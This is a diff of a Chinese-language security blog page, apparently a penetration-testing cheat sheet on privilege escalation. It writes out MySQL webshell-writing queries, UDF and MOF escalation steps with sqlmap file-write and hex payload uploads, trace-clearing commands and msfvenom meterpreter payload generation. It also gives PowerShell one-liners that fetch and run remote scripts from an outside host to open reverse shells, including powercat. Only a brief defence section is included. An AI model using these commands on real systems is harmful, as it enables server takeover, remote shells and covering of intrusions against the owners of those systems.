@@ -95,7 +95,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">2.8k</span>
+            <span class="post-count">3.6k</span>
         </span>
     </span>
 
@@ -104,7 +104,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> 阅读时长≈</span>
-            <span class="post-count">11 分钟</span>
+            <span class="post-count">15 分钟</span>
         </span>
     </span>
 </div>
@@ -119,16 +119,63 @@
   
     <div class="article-entry" itemprop="articleBody">
        
-  <h1 id="1-1-权限说明"><a href="#1-1-权限说明" class="headerlink" title="1.1.权限说明"></a>1.1.权限说明</h1><blockquote>
+  <h1 id="1-1-权限说明"><a href="#1-1-权限说明" class="headerlink" title="1.1.权限说明"></a>1.1.权限说明</h1><ul>
+<li><p>后台权限:SQL注入,致据库备份泄露，默认或弱口令等获取帐号密码进入。</p>
+</li>
+<li><p>网站权限:后台提升至网站权限，RCE或文件操作类、反序列化等漏洞直达shell。</p>
+<p><strong>前提：</strong></p>
+<blockquote>
 <ul>
-<li>后台权限:SQL注入,致据库备份泄露，默认或弱口令等获取帐号密码进入。</li>
-<li>网站权限:后台提升至网站权限，RCE或文件操作类、反序列化等漏洞直达shell。</li>
-<li>数据库权限:SQL注入数据库备份泄露。默认或弱口令等进入或网站权限获取后转入。</li>
-<li>接口权限:SQL注入,数据库备份泄露，源码泄漏，配置不当等或网站权限获取后转入。</li>
-<li>系统权限:高危系统漏洞直达或网站权限提升转入、数据库权限提升转入。第三方转入等。</li>
-<li>域控权限:高危系统漏洞直达或内网横向渗透转入，域控其他服务安全转入等。</li>
+<li><p>已知网站物理路径且该路径有写权限</p>
+</li>
+<li><p>高权限数据库用户</p>
+</li>
+<li><p>secure_file_priv 无限制</p>
+<blockquote>
+<p>在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件</p>
+<p>在 MySQL 5.5之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件</p>
+</blockquote>
+</li>
 </ul>
 </blockquote>
+</li>
+</ul>
+<h3 id="into-outfile文件"><a href="#into-outfile文件" class="headerlink" title="into outfile文件"></a>into outfile文件</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php phpinfo(); ?&gt;&#x27;</span> <span class="keyword">into</span> outfile <span class="string">&#x27;/var/www/html/info.php&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>sqlmap 下可以执行如下操作：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://x.x.x.x/?id=x&quot;</span> --file-write=<span class="string">&quot;/path/to/shell.php&quot;</span> --file-dest=<span class="string">&quot;/var/www/html/test/shell.php&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>一般情况下 Linux 系统下面权限分配比较严格，MySQL 用户一般情况下是无法直接往站点根目录写入文件的，这种情况下在 Windows 环境下成功率会很高。</p>
+<h3 id="terminated-by-写文件"><a href="#terminated-by-写文件" class="headerlink" title="terminated by 写文件"></a>terminated by 写文件</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> limit <span class="number">1</span> <span class="keyword">into</span> outfile <span class="string">&#x27;C:/wamp64/www/work/webshell.php&#x27;</span> lines terminated <span class="keyword">by</span> <span class="string">&#x27;&lt;?php phpinfo() ?&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<h3 id="general-log-写文件"><a href="#general-log-写文件" class="headerlink" title="general log 写文件"></a>general log 写文件</h3><p>MySQL 5.0 版本以上会创建日志文件，可以通过修改日志的全局变量来 getshell</p>
+<blockquote>
+<p><code>general_log</code> 默认关闭，开启它可以记录用户输入的每条命令，会把其保存在对应的日志文件中</p>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;general%&#x27;</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+---------------------------------+</span></span><br><span class="line"><span class="operator">|</span> Variable_name    <span class="operator">|</span> <span class="keyword">Value</span>                           <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+---------------------------------+</span></span><br><span class="line"><span class="operator">|</span> general_log      <span class="operator">|</span> OFF                             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> general_log_file <span class="operator">|</span> <span class="operator">/</span>var<span class="operator">/</span>lib<span class="operator">/</span>mysql<span class="operator">/</span>c1595d3a029a.log <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+---------------------------------+</span></span><br></pre></td></tr></table></figure>
+
+<p>通过将 <code>general_log</code> 存储位置改为 web 目录。同时，向日志文件里面写入内容的话，那么就可以成功 getshell</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># 更改日志文件位置</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log <span class="operator">=</span> &quot;ON&quot;;</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file<span class="operator">=</span><span class="string">&#x27;/var/www/html/info.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"># 查看当前配置</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;general%&#x27;</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-----------------------------+</span></span><br><span class="line"><span class="operator">|</span> Variable_name    <span class="operator">|</span> <span class="keyword">Value</span>                       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-----------------------------+</span></span><br><span class="line"><span class="operator">|</span> general_log      <span class="operator">|</span> <span class="keyword">ON</span>                          <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> general_log_file <span class="operator">|</span> <span class="operator">/</span>var<span class="operator">/</span>www<span class="operator">/</span>html<span class="operator">/</span>shell.php     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-----------------------------+</span></span><br><span class="line"></span><br><span class="line"># 往日志里面写入 payload</span><br><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>访问这个php文件呢，会出现 HTTP 500 的状态码</p>
+<ul>
+<li><p>数据库权限:SQL注入数据库备份泄露。默认或弱口令等进入或网站权限获取后转入。</p>
+<blockquote>
+<ul>
+<li>3306 弱口令爆破</li>
+<li>sqlmap 的 –sql-shell 模式</li>
+<li>网站的数据库配置文件中拿到明文密码信息</li>
+<li>mysql 1day 漏洞获取权限</li>
+</ul>
+</blockquote>
+</li>
+<li><p>接口权限:SQL注入,数据库备份泄露，源码泄漏，配置不当等或网站权限获取后转入。</p>
+</li>
+<li><p>系统权限:高危系统漏洞直达或网站权限提升转入、数据库权限提升转入。第三方转入等。</p>
+</li>
+<li><p>域控权限:高危系统漏洞直达或内网横向渗透转入，域控其他服务安全转入等。</p>
+</li>
+</ul>
 <h1 id="1-2-权限提升流程"><a href="#1-2-权限提升流程" class="headerlink" title="1.2.权限提升流程"></a>1.2.权限提升流程</h1><p>后台权限&gt;web权限&gt;系统权限&gt;域控权限</p>
 <h1 id="1-3-中间件语言类权限"><a href="#1-3-中间件语言类权限" class="headerlink" title="1.3.中间件语言类权限"></a>1.3.中间件语言类权限</h1><p>jsp、java搭建的站点连接上后直接就是系统权限。</p>
 <h1 id="2-1-windows"><a href="#2-1-windows" class="headerlink" title="2.1.windows:"></a>2.1.windows:</h1><p>Windows提权大概有三个方向：溢出提权、数据库提权、第三方软件提权、错误的系统配置提权、组策略首选项提权、窃取令牌提权、bypassuac提权，第三方软件&#x2F;服务提权，WEB中间件漏洞提权等。</p>
@@ -167,12 +214,13 @@
 <p>远程下载PowerView.ps1脚本，并执行其中的Get-Netdomain模块</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -exec bypass -c IEX (New-Object System.Net.Webclient).DownloadString(&#x27;http://xx.xx.xx.xx/powerview.ps1&#x27;);import-module .\powerview.ps1;Get-NetDomain</span><br></pre></td></tr></table></figure>
 
-<h3 id="windows反弹shell"><a href="#windows反弹shell" class="headerlink" title="windows反弹shell"></a>windows反弹shell</h3><h4 id="cmd反弹msf-shell"><a href="#cmd反弹msf-shell" class="headerlink" title="cmd反弹msf shell"></a>cmd反弹msf shell</h4><p>首先在vps上操作</p>
+<h3 id="windows反弹shell"><a href="#windows反弹shell" class="headerlink" title="windows反弹shell"></a>windows反弹shell</h3><h4 id="cmd反弹msf-shell"><a href="#cmd反弹msf-shell" class="headerlink" title="cmd反弹msf shell"></a>cmd反弹msf shell</h4><p>首先在kali上操作</p>
 <blockquote>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.6.54.194 lport=7788 -f psh-reflection -o 7788.ps1        #生成木马文件 7788.ps1</span><br><span class="line">python -m SimpleHTTPServer 80  #开启web服务</span><br><span class="line">#MSF监听</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">set lhost 10.6.54.194</span><br><span class="line">set lport 7788</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
 </blockquote>
+<p>目标机器上操作</p>
 <blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#目标机器上操作</span><br><span class="line">powershell -windowstyle hidden -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;http://http://10.6.54.194:8000/7788.ps1&#x27;);xx.ps1&quot;  #后台运行</span><br><span class="line">或者</span><br><span class="line">powershell -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;http://10.6.54.194:8000/7788.ps1&#x27;);xx.ps1&#x27;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">powershell -windowstyle hidden -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;http://http://10.6.54.194:8000/7788.ps1&#x27;);xx.ps1&quot;  #后台运行</span><br><span class="line">或者</span><br><span class="line">powershell -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;http://10.6.54.194:8000/7788.ps1&#x27;);xx.ps1&#x27;</span><br></pre></td></tr></table></figure>
 </blockquote>
 <h4 id="cmd窗口下利用Powershell反弹NC-shell"><a href="#cmd窗口下利用Powershell反弹NC-shell" class="headerlink" title="cmd窗口下利用Powershell反弹NC shell"></a><strong>cmd窗口下利用Powershell反弹NC shell</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object System.Net.Webclient).DownloadString(&#x27;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#x27;);powercat -c 10.6.54.194 -p 8888 -e cmd</span><br><span class="line"></span><br><span class="line">powershell -nop -exec bypass -c &quot;IEX (New-Object System.Net.Webclient)DownloadString(&#x27;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#x27;);powercat -c 10.6.54.194  -p 8888 -e cmd.exe&quot;</span><br></pre></td></tr></table></figure>
 
@@ -180,13 +228,26 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://10.6.54.194:8080/a&#x27;))&quot;   #后台运行</span><br><span class="line"></span><br><span class="line">powershell.exe  -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://10.6.54.194:8080/a&#x27;))&quot;</span><br></pre></td></tr></table></figure>
 
 <h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>工具和文件下载部分，参考先知社区<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12588">断*奏</a></p>
-<h1 id="2-2Mysql提权"><a href="#2-2Mysql提权" class="headerlink" title="2.2Mysql提权"></a>2.2Mysql提权</h1><h2 id="udf"><a href="#udf" class="headerlink" title="udf"></a>udf</h2><p>拿下一台windows服务器的webshell时，由于webshell权限较低，有些操作无法进行，而此时本地恰好存在mysql数据库，那么udf可能就派上用场了；</p>
+<h1 id="2-2Mysql提权"><a href="#2-2Mysql提权" class="headerlink" title="2.2Mysql提权"></a>2.2Mysql提权</h1><h2 id="udf"><a href="#udf" class="headerlink" title="udf"></a>udf</h2><p>User Defined Function - 自定义函数，添加新函数在sql语句中调用</p>
+<p>拿下一台windows服务器的webshell时，由于webshell权限较低，有些操作无法进行，而此时本地恰好存在mysql数据库，那么udf可能就派上用场了；</p>
 <p>尝试udf提权，其实质就是<code>以MySQL的身份执行系统命令</code></p>
-<h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><p>1.secure_file_priv为空，有导入导出权限</p>
+<h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><blockquote>
+<p>1.secure_file_priv为空，有导入导出权限</p>
 <p>2.有上传目录</p>
-<p>3.账号有insert何delete权限</p>
-<p>mysql版本大于5.1，udf.dll文件必须放置在mysql安装目录的lib\plugin文件夹下，该目录默认是不存在的，需要使用webshell找到mysql的安装目录，并在安装目录下创建MySQL\Lib\Plugin\文件夹（<strong>通过菜刀连接创建</strong>、<br><strong>通过mysql语句创建</strong>），然后将udf.dll导入到该目录（如果不事先在靶机创建plugin目录，可以尝试<strong>利用NTFS ADS流来创建文件夹的方法</strong>，但是会出错）。<br>mysql版本小于5.1， udf.dll文件在windows server 2003下放置于c:\windows\system32目录，在windows server 2000下放置在c:\winnt\system32目录。</p>
-<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>dll常见函数</p>
+<p>3.账号有insert和delete权限</p>
+</blockquote>
+<p>mysql版本&gt;&#x3D;5.1，udf.dll文件必须放置在mysql安装目录的lib\plugin文件夹下，该目录默认是不存在的，需要使用webshell找到mysql的安装目录，并在安装目录下创建MySQL\Lib\Plugin\文件夹（<strong>通过菜刀连接创建</strong>、或<strong>通过mysql语句创建</strong>），然后将udf.dll导入到该目录（如果不事先在靶机创建plugin目录，可以尝试<strong>利用NTFS ADS流来创建文件夹的方法</strong>，但是会出错）</p>
+<p>windows下可以这样创建目录：</p>
+<p>先找到mysql安装目录</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> @<span class="variable">@basedir</span>;</span><br></pre></td></tr></table></figure>
+
+<p>然后嘞，如下创建：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span><span class="keyword">select</span> <span class="number">233</span> <span class="keyword">into</span> dumpfile <span class="string">&#x27;C:\\PhpStudy\\PHPTutorial\\MySQL\\lib\\plugin::$index_allocation&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>mysql版本&lt;5.1， udf.dll文件在windows server 2003下放置于c:\windows\system32目录，在windows server 2000下放置在c:\winnt\system32目录</p>
+<p>dll常见函数</p>
 <blockquote>
 <ul>
 <li>cmdshell 执行cmd;</li>
@@ -201,28 +262,54 @@
 <li>about 说明与帮助函数;</li>
 </ul>
 </blockquote>
-<p><code>show variables like &quot;%plugin%&quot;</code>&#x2F;&#x2F;查看文件目录是否存在</p>
-<p>将dll文件写入plugin目录,并且创建函数</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE FUNCTION shell RETURNS STRING SONAME &#x27;udf.dll&#x27;</span><br></pre></td></tr></table></figure>
+<h3 id="手写实现"><a href="#手写实现" class="headerlink" title="手写实现"></a>手写实现</h3><h4 id="写入"><a href="#写入" class="headerlink" title="写入"></a>写入</h4><p><code>show variables like &quot;%plugin%&quot;</code>&#x2F;&#x2F;查看文件目录是否存在</p>
+<p>将dll文件写入plugin目录</p>
+<p>*可以直接使用 sqlmap 来上传动态链接库，又因为 GET 有<strong>字节长度限制</strong>，所以往往 <strong>POST 注入</strong>才可以执行这种攻击*</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://localhost/&quot;</span> --data=<span class="string">&quot;id=1&quot;</span> --file-write=<span class="string">&quot;/path/to/lib_mysqludf_sys_64.so&quot;</span> --file-dest=<span class="string">&quot;/usr/lib/mysql/plugin/udf.so&quot;</span></span><br></pre></td></tr></table></figure>
 
-<p>清除痕迹时记得drop…</p>
-<p>总之就是，蚁剑连接后，可以上传一个udf大马，然后导出udf</p>
-<p>再去创建cmdshell函数</p>
-<p>然后利用这个函数，select cmdshell(‘whoami’)</p>
+<p>没有注入的话，我们可以操作原生 SQL 语句，这种情况下当 secure_file_priv 无限制的时候，可以通过手工写文件到 plugin 目录下的：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 直接 <span class="keyword">SELECT</span> 查询十六进制写入</span><br><span class="line"><span class="keyword">SELECT</span> <span class="number">0x7f454c4602</span>... <span class="keyword">INTO</span> DUMPFILE <span class="string">&#x27;/usr/lib/mysql/plugin/udf.so&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>其中十六进制利用 MySQL 自带的 hex 函数来编码：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 直接传入路径编码</span><br><span class="line"><span class="keyword">SELECT</span> hex(load_file(<span class="string">&#x27;/lib_mysqludf_sys_64.so&#x27;</span>));</span><br><span class="line"></span><br><span class="line"># 也可以将路径 hex 编码</span><br><span class="line"><span class="keyword">SELECT</span> hex(load_file(<span class="number">0x2f6c69625f6d7973716c7564665f7379735f36342e736f</span>));</span><br></pre></td></tr></table></figure>
+
+<h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p>并且创建函数</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> sys_eval <span class="keyword">RETURNS</span> STRING SONAME <span class="string">&#x27;udf.dll&#x27;</span>;</span><br><span class="line"><span class="keyword">select</span> sys_eval(<span class="string">&#x27;whoami&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<h4 id="清除痕迹"><a href="#清除痕迹" class="headerlink" title="清除痕迹"></a>清除痕迹</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">function</span> sys_eval;</span><br></pre></td></tr></table></figure>
+
+<h3 id="UDF-shell"><a href="#UDF-shell" class="headerlink" title="UDF shell"></a>UDF shell</h3><p>假设目标 MySQL 在内网情况下，无法直连 MySQL 或者 MySQL 不允许外连，这个时候一些网页脚本就比较方便好用了</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/echohun/tools/blob/master/%E5%A4%A7%E9%A9%AC/udf.php">UDF命令执行大马点击此处</a></p>
+<p>使用 Navicat 自带的 tunnel 隧道脚本上传到目标网站上</p>
+<h3 id="msf实现"><a href="#msf实现" class="headerlink" title="msf实现"></a>msf实现</h3><p>msf启用NC监听，然后目标机上导入dll动态链接库</p>
+<p>再去自定义创建cmdshell函数</p>
+<p>然后利用这个函数，<code>select cmdshell(&#39;whoami&#39;)</code></p>
 <p>可以创建反弹shell函数backshell</p>
-<p>攻击机建立监听窗口，再远程执行shell反弹函数</p>
-<p>利用反弹的shell，开启3389端口</p>
-<p>创建用户，加入到管理员组。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> backshell(&quot;IP&quot;, <span class="number">3389</span>);</span><br></pre></td></tr></table></figure>
+
+
+
+<p>然后创建用户，加入到管理员组。</p>
 <p>攻击机利用创建的用户和密码进行远程桌面连接</p>
+<p>ps:</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.geekby.site/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/#31-%E5%8E%9F%E7%90%86">Geekby’s Blog</a></p>
+</blockquote>
 <h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><p>(1)尽量避免提供对外链接，通过mysql中的user表进行查看，禁用“%”。</p>
 <p>(2)设置复杂的Root账号密码。</p>
 <p>(3)对my.ini设置只读属性，设置plugin目录为只读目录。</p>
-<h2 id="mof"><a href="#mof" class="headerlink" title="mof"></a>mof</h2><p> mof是windows系统的一个文件，存储在c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;nullevt.mof，叫做”<strong>托管对象格式</strong>“，其作用是每隔五秒就会去监控进程创建和死亡。然而提权的原理就是在拥有了mysql的root权限以后(其实就是获得了MySQL的启动身份)，然后使用该权限去执行我们上传的mof。隔了一定时间以后这个mof就会被执行，这个mof当中有一段是vbs脚本，这个vbs脚本段大多数写的是cmd的添加管理员用户的命令。</p>
+<h2 id="MOF提权"><a href="#MOF提权" class="headerlink" title="MOF提权"></a>MOF提权</h2><p> mof是windows系统的一个文件，存储在：</p>
+<p><code>c:/windows/system32/wbem/mof/nullevt.mof</code>，叫做”<strong>托管对象格式</strong>“</p>
+<p>其作用是每隔<strong>五秒</strong>就会去监控进程创建和死亡。</p>
+<p>然而提权的原理就是在拥有了mysql的root权限以后(其实就是获得了MySQL的启动身份)，</p>
+<p>然后使用该权限去执行我们上传的mof。隔了一定时间以后这个mof就会被执行</p>
+<p>这个mof当中有一段是vbs脚本，这个vbs脚本段大多数写的是cmd的添加管理员用户的命令</p>
+<p>如果 MySQL 有权限操作 mof 目录的话，就可以来执行任意命令了</p>
 <h3 id="条件-1"><a href="#条件-1" class="headerlink" title="条件"></a>条件</h3><p>（1）操作系统版本：<strong>Windows Server 2003及以下版本</strong>；</p>
 <p>（2）有MySQL数据库的连接数据；</p>
 <p>（3）MySQL的配置文件my.ini中的<strong>secure-file-priv</strong>参数要为空(这个空不是NULL)；</p>
 <p>（4）MySQL启动身份具<strong>有权限去读写</strong>c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof目录；</p>
-<h3 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h3><p>1.上传一句话，蚁剑连接；</p>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>1.上传一句话，蚁剑连接；</p>
 <p>假设获得了数据库的连接数据。<code>www/data/config.php</code></p>
 <p>2.蚁剑连接数据库</p>
 <p>执行命令</p>
@@ -239,7 +326,9 @@
 <p>其实如果目标机设置了<strong>给MySQL的启动用户赋予完全控制mof文件夹以及子文件夹的权限</strong>的话，那就会写入成功。</p>
 <p><strong>同时成功创建了test01管理员组用户</strong></p>
 <p>其实写可以利用现成的mof.php文件，上传上去后，访问，进行一系列输入，自动写入mof文件。</p>
-<h1 id="2-3linux提权"><a href="#2-3linux提权" class="headerlink" title="2.3linux提权"></a>2.3linux提权</h1><p>Suid提权：普通用户去执行 root 权限的操作，而不需要知道 root 的密码<br>第三方软件提权</p>
+<p><a target="_blank" rel="noopener" href="https://www.geekby.site/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/#4-%E5%90%AF%E5%8A%A8%E9%A1%B9%E6%8F%90%E6%9D%83">mysql提权方法整理</a></p>
+<h1 id="2-3linux提权"><a href="#2-3linux提权" class="headerlink" title="2.3linux提权"></a>2.3linux提权</h1><p>Suid提权：普通用户去执行 root 权限的操作，而不需要知道 root 的密码</p>
+<p>第三方软件提权</p>
  
       <!-- reward -->
       
@@ -317,19 +406,19 @@
    
   <nav class="article-nav">
     
-      <a href="/2023/07/01/%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" class="article-nav-link">
+      <a href="/2023/07/01/%E5%AE%9E%E6%88%98/" class="article-nav-link">
         <strong class="article-nav-caption">上一篇</strong>
         <div class="article-nav-title">
           
-            漏洞汇总
+            实战记录
           
         </div>
       </a>
     
     
-      <a href="/2023/06/30/vulnhub/" class="article-nav-link">
+      <a href="/2023/07/01/%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title">vulnhub</div>
+        <div class="article-nav-title">漏洞汇总</div>
       </a>
     
   </nav>
